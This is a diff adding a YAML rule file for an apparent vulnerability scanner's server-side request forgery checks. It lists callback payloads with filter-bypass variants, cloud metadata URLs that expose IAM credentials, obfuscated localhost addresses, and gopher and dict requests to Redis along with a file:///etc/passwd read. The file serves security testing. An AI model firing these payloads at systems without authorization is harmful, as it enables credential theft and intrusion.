@@ -1,0 +1,151 @@
+# knowledge/rules/ssrf_rules.yaml
+# SAM-∞ v28-Ω  Server-Side Request Forgery (SSRF) Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: ssrf
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "SSRF 检测规则集：OAST DNS/HTTP 回调验证；内网探测；云 metadata endpoint"
+
+default_oracle_pattern: ""
+oracle_type: "oast_dns_or_http"
+note: "SSRF 验证必须通过 OAST 物理回调确认，不得以 HTTP 状态码作为证明"
+
+# ── OAST 基础 payload 模板 ─────────────────────────────────────────────────────
+payloads:
+  # 标准 HTTP 请求触发
+  - payload: "http://{oast_domain}/{correlation_id}"
+    oracle_type: oast_http
+    confidence: 0.92
+    note: "替换 oast_domain 和 correlation_id"
+
+  - payload: "https://{oast_domain}/{correlation_id}"
+    oracle_type: oast_http
+    confidence: 0.90
+
+  - payload: "http://{correlation_id}.{oast_domain}/"
+    oracle_type: oast_dns
+    confidence: 0.92
+    note: "DNS 查询触发（subdomain 携带 correlation_id）"
+
+  # URL 编码变体
+  - payload: "http%3A%2F%2F{oast_domain}%2F{correlation_id}"
+    oracle_type: oast_http
+    bypass_variant: url_encoded
+    confidence: 0.85
+
+  # 双重 URL 编码
+  - payload: "http%253A%252F%252F{oast_domain}%252F{correlation_id}"
+    oracle_type: oast_http
+    bypass_variant: double_url_encoded
+    confidence: 0.80
+
+  # IPv6 形式绕过某些过滤器
+  - payload: "http://[{oast_domain}]/{correlation_id}"
+    oracle_type: oast_http
+    bypass_variant: ipv6_form
+    confidence: 0.75
+
+  # Fragment bypass
+  - payload: "http://{oast_domain}/{correlation_id}#http://legitimate.com"
+    oracle_type: oast_http
+    bypass_variant: fragment_bypass
+    confidence: 0.72
+
+  # 协议变体
+  - payload: "ftp://{oast_domain}/{correlation_id}"
+    oracle_type: oast_dns
+    bypass_variant: ftp_protocol
+    confidence: 0.70
+
+  - payload: "ldap://{oast_domain}/{correlation_id}"
+    oracle_type: oast_dns
+    bypass_variant: ldap_protocol
+    confidence: 0.68
+
+  # @符号绕过
+  - payload: "http://legitimate.com@{oast_domain}/{correlation_id}"
+    oracle_type: oast_http
+    bypass_variant: at_sign_bypass
+    confidence: 0.73
+
+  # 嵌套 URL
+  - payload: "http://{oast_domain}/?url=http://legitimate.com"
+    oracle_type: oast_http
+    bypass_variant: nested_url
+    confidence: 0.70
+
+# ── 内网探测 payload ────────────────────────────────────────────────────────────
+internal_probe:
+  aws_metadata:
+    urls:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/user-data/"
+    oracle_pattern: "ami-id|instance-id|security-credentials"
+    confidence: 0.85
+
+  gcp_metadata:
+    urls:
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://169.254.169.254/computeMetadata/v1/"
+    oracle_pattern: "project-id|instance|service-accounts"
+    confidence: 0.85
+    note: "需要 Header: Metadata-Flavor: Google"
+
+  azure_metadata:
+    urls:
+      - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    oracle_pattern: "subscriptionId|resourceGroupName|vmId"
+    confidence: 0.85
+    note: "需要 Header: Metadata: true"
+
+  alibaba_metadata:
+    urls:
+      - "http://100.100.100.200/latest/meta-data/"
+    oracle_pattern: "instance-id|mac|vpc-id"
+    confidence: 0.83
+
+  kubernetes:
+    urls:
+      - "https://kubernetes.default.svc/api/v1/"
+    oracle_pattern: "\"kind\":\"APIVersions\""
+    confidence: 0.80
+
+  internal_ranges:
+    urls:
+      - "http://127.0.0.1/"
+      - "http://localhost/"
+      - "http://10.0.0.1/"
+      - "http://172.16.0.1/"
+      - "http://192.168.1.1/"
+    oracle_pattern: ""
+    note: "内网探测：差分响应判断（响应内容与外部目标不同）"
+
+# ── 过滤器绕过策略 ─────────────────────────────────────────────────────────────
+filter_bypass:
+  # IP 地址绕过
+  ip_obfuscation:
+    - "http://2130706433/"         # 127.0.0.1 的十进制形式
+    - "http://0177.0.0.1/"         # 127.0.0.1 的八进制形式
+    - "http://0x7f000001/"         # 127.0.0.1 的十六进制形式
+    - "http://127.1/"              # 简写形式
+    - "http://127.0.1/"
+    - "http://[::1]/"              # IPv6 localhost
+    - "http://[::ffff:127.0.0.1]/" # IPv4-mapped IPv6
+
+  # DNS rebinding
+  dns_rebinding:
+    description: "先解析为合法 IP，绕过检查后解析为内网 IP"
+    service_example: "rbndr.us（注册自定义 DNS rebinding 域名）"
+
+  # scheme 绕过
+  scheme_bypass:
+    - "dict://127.0.0.1:6379/info"    # Redis
+    - "gopher://127.0.0.1:6379/_*1"  # Redis（gopher 协议）
+    - "file:///etc/passwd"             # 本地文件读取
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
